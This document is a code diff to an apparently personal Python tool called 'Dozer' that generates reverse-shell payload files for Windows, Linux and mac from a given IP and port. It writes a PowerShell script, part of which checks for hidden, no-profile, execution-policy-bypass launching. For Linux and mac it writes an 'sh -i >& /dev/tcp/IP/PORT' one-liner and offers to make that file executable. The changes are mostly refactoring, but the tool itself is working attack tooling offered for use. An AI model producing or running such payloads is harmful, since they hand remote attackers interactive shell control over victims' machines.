@@ -1,6 +1,5 @@
 import argparse
 import ipaddress
-from os import PRIO_USER
 import sys
 import socket
 import subprocess
@@ -17,12 +16,17 @@ class Dozer:
         """
         if not self.__check_ip(ip):
             self.__error("invalid ip")
+            sys.exit(1)
         self.ip = ip
         self.port = port
         self.os = os
         self.output_filename = output
 
     def create(self):
+        """
+        create super cool fancy reverse shell
+        """
+
         print("creating dozer_shell")
         print("-------------")
         print(f"ip = {self.ip}")
@@ -32,21 +36,27 @@ class Dozer:
 
         match self.os:
             case "windows":
-                print("creating revshell for windows")
-                self.windows_rev_shell()
+                print(f"creating {self.output_filename} revshell for windows")
+                self.__windows_rev_shell()
             case "linux":
-                self.mac_linux_shell()
+                print(f"creating {self.output_filename} revshell for linux")
+                self.__mac_linux_shell()
             case "mac":
-                print("creating revshell for mac")
-                self.mac_linux_shell()
+                print(f"creating {self.output_filename} revshell for mac")
+                self.__mac_linux_shell()
             case "android":
-                print("creating revshell for android")
+                print(f"creating {self.output_filename} revshell for android")
+                print("not available yet :( ")
             case "ios":
+                print(f"creating {self.output_filename} revshell for ios")
                 print("creating revshell for ios")
 
         return
 
-    def windows_rev_shell(self):
+    def init_listener(self) -> bool:
+        return True
+
+    def __windows_rev_shell(self) -> None:
         ps_script = f"""\
 # Check if script is running with the right args (hidden, no profile, bypass)
 if (-not ($MyInvocation.InvocationName -like "*-nop*" -and $host.UI.RawUI.WindowTitle -eq "")) {{
@@ -86,32 +96,31 @@ $StreamWriter.Close()
 
         with open(f"{self.output_filename}.ps1", "w", encoding="utf-8") as f:
             f.write(ps_script)
-            print(f"created {self.output_filename} file")
+            print(f"//LOG: created {self.output_filename} file")
 
-    def mac_linux_shell(self):
+    def __mac_linux_shell(self) -> None:
         """
         mac and linux has same rev shell, fuck your naming patterns
         """
         script = f"sh -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
         with open(f"{self.output_filename}.sh", "w", encoding="utf-8") as f:
             f.write(script)
-            print(f"created {self.output_filename}.sh")
+            print(f"//LOG: created {self.output_filename}.sh")
             user_input = input("do you wanna make it executable (Y/n): ").lower()
             if user_input == "y":
-                print("making rev shell executable")
+                print("//LOG: making rev shell executable")
                 subprocess.run(["chmod", "+x", f"{self.output_filename}.sh"])
-                print("revshell is now exectuable!")
+                print("//LOG: revshell is now exectuable!")
 
-    def __check_ip(self, ip: str):
+    def __check_ip(self, ip: str) -> bool:
         try:
             ipaddress.ip_address(ip)
             return True
         except ValueError:
             return False
 
-    def __error(self, err_message: str):
+    def __error(self, err_message: str) -> None:
         print(err_message)
-        sys.exit(1)
 
 
 def main():
@@ -151,6 +160,8 @@ def main():
 
     if args.output is None:
         args.output = "rev_shell"
+
+    # that's all i need to see in main lol
     tool = Dozer(ip=args.ip, port=args.port, os=args.os, output=args.output)
     tool.create()
 
